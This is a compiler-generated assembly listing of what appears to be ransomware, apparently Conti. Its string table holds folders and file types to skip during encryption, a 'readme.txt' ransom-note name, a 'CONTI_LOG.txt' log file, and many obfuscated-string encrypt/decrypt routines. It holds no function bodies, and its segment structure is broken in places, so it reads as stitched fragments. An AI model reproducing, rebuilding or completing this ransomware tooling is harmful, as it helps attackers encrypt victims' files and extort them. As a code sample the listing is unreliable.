; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB OLDNAMES

PUBLIC	??_C@_13BBDEGPLJ@?$AA?$CK@			; `string'
PUBLIC	??_C@_15PKPONJIK@?$AA?2?$AA?$CK@		; `string'
PUBLIC	??_C@_13FPGAJAPJ@?$AA?2@			; `string'
PUBLIC	??_C@_17GNJCADOE@?$AAt?$AAm?$AAp@		; `string'
PUBLIC	??_C@_1M@OKMIJFDJ@?$AAw?$AAi?$AAn?$AAn?$AAt@	; `string'
PUBLIC	??_C@_19KEIJKAKM@?$AAt?$AAe?$AAm?$AAp@		; `string'
PUBLIC	??_C@_1M@KAKDHLGH@?$AAt?$AAh?$AAu?$AAm?$AAb@	; `string'
PUBLIC	??_C@_1BK@FDOENKL@?$AA$?$AAR?$AAe?$AAc?$AAy?$AAc?$AAl?$AAe?$AA?4?$AAB?$AAi?$AAn@ ; `string'
PUBLIC	??_C@_1BK@KPOPEFAG@?$AA$?$AAR?$AAE?$AAC?$AAY?$AAC?$AAL?$AAE?$AA?4?$AAB?$AAI?$AAN@ ; `string'
PUBLIC	??_C@_1DE@LIBHJBEH@?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA?5?$AAV?$AAo?$AAl?$AAu?$AAm?$AAe?$AA?5?$AAI@ ; `string'
PUBLIC	??_C@_19JCAOHIEH@?$AAB?$AAo?$AAo?$AAt@		; `string'
PUBLIC	??_C@_1BA@HLGGGPNC@?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs@ ; `string'
PUBLIC	??_C@_1BI@ILHACKKN@?$AAT?$AAr?$AAe?$AAn?$AAd?$AA?5?$AAM?$AAi?$AAc?$AAr?$AAo@ ; `string'
PUBLIC	??_C@_1BC@HAJBCMBC@?$AAp?$AAe?$AAr?$AAf?$AAl?$AAo?$AAg?$AAs@ ; `string'
PUBLIC	??_C@_19DOGDICKI@?$AA?4?$AAe?$AAx?$AAe@		; `string'
PUBLIC	??_C@_19BHIGINDB@?$AA?4?$AAd?$AAl?$AAl@		; `string'
PUBLIC	??_C@_19BEHMAPDG@?$AA?4?$AAl?$AAn?$AAk@		; `string'
PUBLIC	??_C@_19DKJJGBOC@?$AA?4?$AAs?$AAy?$AAs@		; `string'
PUBLIC	??_C@_19MNJHNGGG@?$AA?4?$AAm?$AAs?$AAi@		; `string'
PUBLIC	??_C@_1BG@ICLDBDGN@?$AAr?$AAe?$AAa?$AAd?$AAm?$AAe?$AA?4?$AAt?$AAx?$AAt@ ; `string'
PUBLIC	??_C@_1BM@CNNHHOMD@?$AAC?$AAO?$AAN?$AAT?$AAI?$AA_?$AAL?$AAO?$AAG?$AA?4?$AAt?$AAx?$AAt@ ; `string'
PUBLIC	??_C@_19PINKOIBI@?$AA?4?$AAb?$AAa?$AAt@		; `string'
PUBLIC	??_C@_1HC@LEGLMILJ@?$AAF?$AAi?$AAn?$AAd?$AAF?$AAi?$AAr?$AAs?$AAt?$AAF?$AAi?$AAl?$AAe?$AA?5?$AAf@ ; `string'
PUBLIC	??_C@_13JOFGPIOO@?$AA?4@			; `string'
PUBLIC	??_C@_15DDHGOCBH@?$AA?4?$AA?4@			; `string'
_DATA	ENDS
;	COMDAT ??_C@_15DDHGOCBH@?$AA?4?$AA?4@
CONST	SEGMENT
??_C@_15DDHGOCBH@?$AA?4?$AA?4@ DB '.', 00H, '.', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_13JOFGPIOO@?$AA?4@
CONST	SEGMENT
??_C@_13JOFGPIOO@?$AA?4@ DB '.', 00H, 00H, 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_1HC@LEGLMILJ@?$AAF?$AAi?$AAn?$AAd?$AAF?$AAi?$AAr?$AAs?$AAt?$AAF?$AAi?$AAl?$AAe?$AA?5?$AAf@
CONST	SEGMENT
??_C@_1HC@LEGLMILJ@?$AAF?$AAi?$AAn?$AAd?$AAF?$AAi?$AAr?$AAs?$AAt?$AAF?$AAi?$AAl?$AAe?$AA?5?$AAf@ DB 'F'
	DB	00H, 'i', 00H, 'n', 00H, 'd', 00H, 'F', 00H, 'i', 00H, 'r', 00H
	DB	's', 00H, 't', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ' '
	DB	00H, 'f', 00H, 'a', 00H, 'i', 00H, 'l', 00H, 's', 00H, ' ', 00H
	DB	'i', 00H, 'n', 00H, ' ', 00H, 'd', 00H, 'i', 00H, 'r', 00H, 'e'
	DB	00H, 'c', 00H, 't', 00H, 'o', 00H, 'r', 00H, 'y', 00H, ' ', 00H
	DB	'%', 00H, 's', 00H, '.', 00H, ' ', 00H, 'G', 00H, 'e', 00H, 't'
	DB	00H, 'L', 00H, 'a', 00H, 's', 00H, 't', 00H, 'E', 00H, 'r', 00H
	DB	'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H, '=', 00H, ' ', 00H, '%'
	DB	00H, 'l', 00H, 'u', 00H, '.', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_19PINKOIBI@?$AA?4?$AAb?$AAa?$AAt@
CONST	SEGMENT
??_C@_19PINKOIBI@?$AA?4?$AAb?$AAa?$AAt@ DB '.', 00H, 'b', 00H, 'a', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BM@CNNHHOMD@?$AAC?$AAO?$AAN?$AAT?$AAI?$AA_?$AAL?$AAO?$AAG?$AA?4?$AAt?$AAx?$AAt@
CONST	SEGMENT
??_C@_1BM@CNNHHOMD@?$AAC?$AAO?$AAN?$AAT?$AAI?$AA_?$AAL?$AAO?$AAG?$AA?4?$AAt?$AAx?$AAt@ DB 'C'
	DB	00H, 'O', 00H, 'N', 00H, 'T', 00H, 'I', 00H, '_', 00H, 'L', 00H
	DB	'O', 00H, 'G', 00H, '.', 00H, 't', 00H, 'x', 00H, 't', 00H, 00H
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_1BG@ICLDBDGN@?$AAr?$AAe?$AAa?$AAd?$AAm?$AAe?$AA?4?$AAt?$AAx?$AAt@
CONST	SEGMENT
??_C@_1BG@ICLDBDGN@?$AAr?$AAe?$AAa?$AAd?$AAm?$AAe?$AA?4?$AAt?$AAx?$AAt@ DB 'r'
	DB	00H, 'e', 00H, 'a', 00H, 'd', 00H, 'm', 00H, 'e', 00H, '.', 00H
	DB	't', 00H, 'x', 00H, 't', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_19MNJHNGGG@?$AA?4?$AAm?$AAs?$AAi@
CONST	SEGMENT
??_C@_19MNJHNGGG@?$AA?4?$AAm?$AAs?$AAi@ DB '.', 00H, 'm', 00H, 's', 00H, 'i'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DKJJGBOC@?$AA?4?$AAs?$AAy?$AAs@
CONST	SEGMENT
??_C@_19DKJJGBOC@?$AA?4?$AAs?$AAy?$AAs@ DB '.', 00H, 's', 00H, 'y', 00H, 's'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BEHMAPDG@?$AA?4?$AAl?$AAn?$AAk@
CONST	SEGMENT
??_C@_19BEHMAPDG@?$AA?4?$AAl?$AAn?$AAk@ DB '.', 00H, 'l', 00H, 'n', 00H, 'k'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BHIGINDB@?$AA?4?$AAd?$AAl?$AAl@
CONST	SEGMENT
??_C@_19BHIGINDB@?$AA?4?$AAd?$AAl?$AAl@ DB '.', 00H, 'd', 00H, 'l', 00H, 'l'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DOGDICKI@?$AA?4?$AAe?$AAx?$AAe@
CONST	SEGMENT
??_C@_19DOGDICKI@?$AA?4?$AAe?$AAx?$AAe@ DB '.', 00H, 'e', 00H, 'x', 00H, 'e'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BC@HAJBCMBC@?$AAp?$AAe?$AAr?$AAf?$AAl?$AAo?$AAg?$AAs@
CONST	SEGMENT
??_C@_1BC@HAJBCMBC@?$AAp?$AAe?$AAr?$AAf?$AAl?$AAo?$AAg?$AAs@ DB 'p', 00H, 'e'
	DB	00H, 'r', 00H, 'f', 00H, 'l', 00H, 'o', 00H, 'g', 00H, 's', 00H
	DB	00H, 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_1BI@ILHACKKN@?$AAT?$AAr?$AAe?$AAn?$AAd?$AA?5?$AAM?$AAi?$AAc?$AAr?$AAo@
CONST	SEGMENT
??_C@_1BI@ILHACKKN@?$AAT?$AAr?$AAe?$AAn?$AAd?$AA?5?$AAM?$AAi?$AAc?$AAr?$AAo@ DB 'T'
	DB	00H, 'r', 00H, 'e', 00H, 'n', 00H, 'd', 00H, ' ', 00H, 'M', 00H
	DB	'i', 00H, 'c', 00H, 'r', 00H, 'o', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@HLGGGPNC@?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs@
CONST	SEGMENT
??_C@_1BA@HLGGGPNC@?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs@ DB 'W', 00H, 'i', 00H
	DB	'n', 00H, 'd', 00H, 'o', 00H, 'w', 00H, 's', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_19JCAOHIEH@?$AAB?$AAo?$AAo?$AAt@
CONST	SEGMENT
??_C@_19JCAOHIEH@?$AAB?$AAo?$AAo?$AAt@ DB 'B', 00H, 'o', 00H, 'o', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1DE@LIBHJBEH@?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA?5?$AAV?$AAo?$AAl?$AAu?$AAm?$AAe?$AA?5?$AAI@
CONST	SEGMENT
??_C@_1DE@LIBHJBEH@?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA?5?$AAV?$AAo?$AAl?$AAu?$AAm?$AAe?$AA?5?$AAI@ DB 'S'
	DB	00H, 'y', 00H, 's', 00H, 't', 00H, 'e', 00H, 'm', 00H, ' ', 00H
	DB	'V', 00H, 'o', 00H, 'l', 00H, 'u', 00H, 'm', 00H, 'e', 00H, ' '
	DB	00H, 'I', 00H, 'n', 00H, 'f', 00H, 'o', 00H, 'r', 00H, 'm', 00H
	DB	'a', 00H, 't', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BK@KPOPEFAG@?$AA$?$AAR?$AAE?$AAC?$AAY?$AAC?$AAL?$AAE?$AA?4?$AAB?$AAI?$AAN@
CONST	SEGMENT
??_C@_1BK@KPOPEFAG@?$AA$?$AAR?$AAE?$AAC?$AAY?$AAC?$AAL?$AAE?$AA?4?$AAB?$AAI?$AAN@ DB '$'
	DB	00H, 'R', 00H, 'E', 00H, 'C', 00H, 'Y', 00H, 'C', 00H, 'L', 00H
	DB	'E', 00H, '.', 00H, 'B', 00H, 'I', 00H, 'N', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BK@FDOENKL@?$AA$?$AAR?$AAe?$AAc?$AAy?$AAc?$AAl?$AAe?$AA?4?$AAB?$AAi?$AAn@
CONST	SEGMENT
??_C@_1BK@FDOENKL@?$AA$?$AAR?$AAe?$AAc?$AAy?$AAc?$AAl?$AAe?$AA?4?$AAB?$AAi?$AAn@ DB '$'
	DB	00H, 'R', 00H, 'e', 00H, 'c', 00H, 'y', 00H, 'c', 00H, 'l', 00H
	DB	'e', 00H, '.', 00H, 'B', 00H, 'i', 00H, 'n', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@KAKDHLGH@?$AAt?$AAh?$AAu?$AAm?$AAb@
CONST	SEGMENT
??_C@_1M@KAKDHLGH@?$AAt?$AAh?$AAu?$AAm?$AAb@ DB 't', 00H, 'h', 00H, 'u', 00H
	DB	'm', 00H, 'b', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19KEIJKAKM@?$AAt?$AAe?$AAm?$AAp@
CONST	SEGMENT
??_C@_19KEIJKAKM@?$AAt?$AAe?$AAm?$AAp@ DB 't', 00H, 'e', 00H, 'm', 00H, 'p'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@OKMIJFDJ@?$AAw?$AAi?$AAn?$AAn?$AAt@
CONST	SEGMENT
??_C@_1M@OKMIJFDJ@?$AAw?$AAi?$AAn?$AAn?$AAt@ DB 'w', 00H, 'i', 00H, 'n', 00H
	DB	'n', 00H, 't', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_17GNJCADOE@?$AAt?$AAm?$AAp@
CONST	SEGMENT
??_C@_17GNJCADOE@?$AAt?$AAm?$AAp@ DB 't', 00H, 'm', 00H, 'p', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_13FPGAJAPJ@?$AA?2@
CONST	SEGMENT
??_C@_13FPGAJAPJ@?$AA?2@ DB '\', 00H, 00H, 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_15PKPONJIK@?$AA?2?$AA?$CK@
CONST	SEGMENT
??_C@_15PKPONJIK@?$AA?2?$AA?$CK@ DB '\', 00H, '*', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_13BBDEGPLJ@?$AA?$CK@
CONST	SEGMENT
??_C@_13BBDEGPLJ@?$AA?$CK@ DB '*', 00H, 00H, 00H	; `string'
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
PUBLIC	??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
PUBLIC	??$forward@AEAPEA_W@std@@YAAEAPEA_WAEAPEA_W@Z	; std::forward<wchar_t * &>
PUBLIC	??$forward@V?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ; std::forward<std::allocator<wchar_t> >
PUBLIC	??$move@AEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YA$$QEAV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEAV10@@Z ; std::move<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > &>
PUBLIC	??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z ; `std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>::operator()
PUBLIC	?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
PUBLIC	?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
PUBLIC	??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z ; std::_Construct_in_place<wchar_t *,wchar_t * &>
PUBLIC	??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z ; std::addressof<std::_String_val<std::_Simple_types<wchar_t> > >
PUBLIC	??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<2,wchar_t const *>
PUBLIC	??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct<1,wchar_t const *>
PUBLIC	??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1><std::allocator<wchar_t> >
PUBLIC	??$move@AEAV?$allocator@_W@std@@@std@@YA$$QEAV?$allocator@_W@0@AEAV10@@Z ; std::move<std::allocator<wchar_t> &>
PUBLIC	??$_Pocca@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@AEBV10@@Z ; std::_Pocca<std::allocator<wchar_t> >
PUBLIC	??$addressof@$$CBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@std@@YAPEBV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@@Z ; std::addressof<std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> > const >
PUBLIC	??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
PUBLIC	?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents
PUBLIC	?isDecrypted@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0GN@$0HB@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<109,113,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$02$09U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<3,10,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CP@$0BD@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<47,19,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BD@$0DI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z ; MetaBuffer<19,56,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BP@$0CF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<31,37,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0FJ@$03U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<89,4,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0DL@$0HN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<59,125,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0EH@$0EA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<71,64,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::isDecrypted
PUBLIC	?encrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$04$0HD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z ; MetaBuffer<5,115,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25> >::decrypt
PUBLIC	?isDecrypted@?$MetaBuffer@$0GF@$0EE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ ; MetaBuffer<101,68,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted
